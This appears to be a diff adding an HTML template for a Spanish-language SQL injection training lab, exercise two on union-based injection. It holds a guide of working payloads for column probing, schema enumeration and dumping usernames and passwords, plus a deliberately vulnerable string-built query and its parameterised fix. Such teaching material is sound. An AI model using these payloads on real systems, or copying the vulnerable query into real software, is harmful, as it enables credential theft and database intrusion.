@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔍 Búsqueda - SQL Injection Lab</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="navigation">
+            <a href="/" class="back-link">← Volver al menú principal</a>
+            <a href="/login" class="back-link">← Ejercicio Anterior</a>
+        </div>
+        
+        <header class="exercise-header">
+            <h1>🔍 Ejercicio 2: Union-Based SQL Injection</h1>
+            <p>Aprende a extraer datos usando UNION SELECT</p>
+        </header>
+        
+        <!-- Mostrar error si hay -->
+        {% if error %}
+            <div class="result-box error">
+                <div class="result-icon">❌</div>
+                <div class="result-content">
+                    <h3>Error en Búsqueda</h3>
+                    <p class="error-message">{{ error }}</p>
+                    <p class="sql-tip">💡 Los errores SQL pueden revelar información sobre la estructura de la base de datos</p>
+                </div>
+            </div>
+        {% endif %}
+        
+        <!-- Formulario de búsqueda -->
+        <div class="form-container">
+            <form method="post" action="/search" class="search-form">
+                <div class="form-group">
+                    <label for="search_term">🔍 Buscar Producto:</label>
+                    <input type="text" id="search_term" name="search_term" 
+                           placeholder="Ej: Laptop, Mouse, etc." 
+                           value="{% if search_term %}{{ search_term }}{% endif %}">
+                </div>
+                <button type="submit" class="btn btn-primary btn-large">🔍 Buscar</button>
+            </form>
+        </div>
+        
+        <!-- Mostrar resultados -->
+        {% if products %}
+            <div class="results-section">
+                <h3>📦 Resultados de Búsqueda ({{ results_count }} encontrados)</h3>
+                <div class="products-grid">
+                    {% for product in products %}
+                        <div class="product-card">
+                            <div class="product-id">ID: {{ product.id }}</div>
+                            <h4>{{ product.name }}</h4>
+                            <div class="product-price">${{ "%.2f"|format(product.price) }}</div>
+                            <p class="product-description">{{ product.description }}</p>
+                        </div>
+                    {% endfor %}
+                </div>
+            </div>
+        {% elif search_term %}
+            <div class="no-results">
+                <p>🔍 No se encontraron productos para: <strong>"{{ search_term }}"</strong></p>
+                <p>💡 Intenta con otros términos o usa técnicas de SQL injection</p>
+            </div>
+        {% endif %}
+        
+        <!-- Mostrar query ejecutada -->
+        {% if query %}
+            <div class="query-display">
+                <h4>🔍 Query SQL Ejecutada:</h4>
+                <div class="query-box">
+                    <code>{{ query }}</code>
+                </div>
+                <p class="query-explanation">
+                    📝 Observa cómo el término de búsqueda se inserta directamente en la consulta LIKE.
+                </p>
+            </div>
+        {% endif %}
+        
+        <!-- Guía de payloads -->
+        <div class="help-section">
+            <h3>💡 Payloads para Union-Based Injection</h3>
+            
+            <div class="payload-category">
+                <h4>🎯 Detectar número de columnas</h4>
+                <div class="payload-examples">
+                    <div class="payload-item">
+                        <strong>Payload:</strong> <code>' ORDER BY 1 --</code><br>
+                        <small>💬 Aumenta el número hasta que dé error para saber cuántas columnas tiene la tabla</small>
+                    </div>
+                    
+                    <div class="payload-item">
+                        <strong>Payload:</strong> <code>' UNION SELECT NULL --</code><br>
+                        <small>💬 Añade NULL por cada columna hasta que no dé error</small>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="payload-category">
+                <h4>🔍 Extraer datos de usuarios</h4>
+                <div class="payload-examples">
+                    <div class="payload-item">
+                        <strong>Payload:</strong> <code>' UNION SELECT id,username,password,email FROM users --</code><br>
+                        <small>💬 Extrae todos los usuarios y sus contraseñas</small>
+                    </div>
+                    
+                    <div class="payload-item">
+                        <strong>Payload:</strong> <code>' UNION SELECT 1,username,password,role FROM users WHERE role='administrator' --</code><br>
+                        <small>💬 Solo extrae usuarios administradores</small>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="payload-category">
+                <h4>🗄️ Explorar estructura de BD</h4>
+                <div class="payload-examples">
+                    <div class="payload-item">
+                        <strong>Payload:</strong> <code>' UNION SELECT 1,name,2,3 FROM sqlite_master WHERE type='table' --</code><br>
+                        <small>💬 Lista todas las tablas de la base de datos</small>
+                    </div>
+                    
+                    <div class="payload-item">
+                        <strong>Payload:</strong> <code>' UNION SELECT 1,sql,2,3 FROM sqlite_master WHERE name='users' --</code><br>
+                        <small>💬 Muestra la estructura de la tabla users</small>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="payload-category">
+                <h4>🎲 Técnicas Avanzadas</h4>
+                <div class="payload-examples">
+                    <div class="payload-item">
+                        <strong>Payload:</strong> <code>' UNION SELECT 1,GROUP_CONCAT(username||':'||password),3,4 FROM users --</code><br>
+                        <small>💬 Concatena todos los usuarios:contraseñas en una sola celda</small>
+                    </div>
+                    
+                    <div class="payload-item">
+                        <strong>Payload:</strong> <code>' UNION SELECT COUNT(*),2,3,4 FROM users --</code><br>
+                        <small>💬 Cuenta cuántos usuarios hay en total</small>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Productos de referencia -->
+        <div class="reference-section">
+            <h3>📋 Productos Disponibles (Referencia)</h3>
+            <div class="products-reference">
+                <ul>
+                    <li><strong>Laptop Dell XPS</strong> - $1299.99</li>
+                    <li><strong>Mouse Logitech MX</strong> - $79.99</li>
+                    <li><strong>Teclado Mecánico Corsair</strong> - $149.99</li>
+                    <li><strong>Monitor Samsung 27"</strong> - $329.99</li>
+                    <li><strong>Webcam Logitech C920</strong> - $89.99</li>
+                    <li><strong>Auriculares Sony</strong> - $199.99</li>
+                </ul>
+                <p class="reference-note">
+                    💡 Intenta buscar términos normales como "Laptop" o "Mouse", luego experimenta con SQL injection.
+                </p>
+            </div>
+        </div>
+        
+        <!-- Explicación técnica -->
+        <div class="explanation-section">
+            <h3>📚 ¿Cómo Funciona Union-Based Injection?</h3>
+            
+            <div class="explanation-content">
+                <h4>🚨 Código Vulnerable:</h4>
+                <div class="code-block">
+                    <code>
+query = f"SELECT id, name, price, description FROM products WHERE name LIKE '%{search_term}%'"
+                    </code>
+                </div>
+                
+                <h4>🔍 Problema:</h4>
+                <ul>
+                    <li>El término de búsqueda se concatena directamente en la query</li>
+                    <li>Permite usar UNION para combinar resultados de otras tablas</li>
+                    <li>No hay validación del formato de entrada</li>
+                </ul>
+                
+                <h4>⚡ Ejemplo de Explotación:</h4>
+                <div class="attack-example">
+                    <p><strong>Input del atacante:</strong></p>
+                    <code>' UNION SELECT id,username,password,email FROM users --</code>
+                    
+                    <p><strong>Query resultante:</strong></p>
+                    <div class="code-block">
+                        <code>
+SELECT id, name, price, description FROM products WHERE name LIKE '%' UNION SELECT id,username,password,email FROM users --%'
+                        </code>
+                    </div>
+                    
+                    <p><strong>Resultado:</strong> Se muestran productos Y usuarios con sus contraseñas en el mismo resultado.</p>
+                </div>
+                
+                <h4>🔑 Condiciones para UNION:</h4>
+                <ul>
+                    <li>Ambas queries deben tener el mismo número de columnas</li>
+                    <li>Los tipos de datos deben ser compatibles</li>
+                    <li>Se pueden usar NULL para ajustar columnas</li>
+                </ul>
+                
+                <h4>🛡️ Prevención:</h4>
+                <div class="code-block">
+                    <code>
+cursor.execute("SELECT id, name, price, description FROM products WHERE name LIKE ?", (f"%{search_term}%",))
+                    </code>
+                </div>
+                <p>Las consultas parametrizadas previenen completamente esta vulnerabilidad.</p>
+            </div>
+        </div>
+        
+        <div class="navigation">
+            <a href="/user/1" class="btn btn-secondary">➡️ Siguiente Ejercicio: Blind Injection</a>
+        </div>
+    </div>
+    
+    <script>
+        // Función para copiar payload
+        function copyPayload(text) {
+            navigator.clipboard.writeText(text).then(function() {
+                alert('📋 Payload copiado: ' + text);
+            });
+        }
+        
+        // Agregar funcionalidad de copia a los payloads
+        document.addEventListener('DOMContentLoaded', function() {
+            const payloads = document.querySelectorAll('.payload-item code');
+            payloads.forEach(function(payload) {
+                payload.style.cursor = 'pointer';
+                payload.title = 'Click para copiar';
+                payload.addEventListener('click', function() {
+                    copyPayload(payload.textContent);
+                });
+            });
+            
+            // Auto-focus en el campo de búsqueda
+            document.getElementById('search_term').focus();
+            
+            // Logging para fines educativos
+            console.log('🔍 SEARCH EXERCISE LOADED');
+            console.log('💡 TIP: Intenta extraer datos de la tabla users usando UNION');
+        });
+        
+        // Función para probar payloads rápidamente
+        function testPayload(payload) {
+            document.getElementById('search_term').value = payload;
+            document.querySelector('.search-form').submit();
+        }
+    </script>
+</body>
+</html>
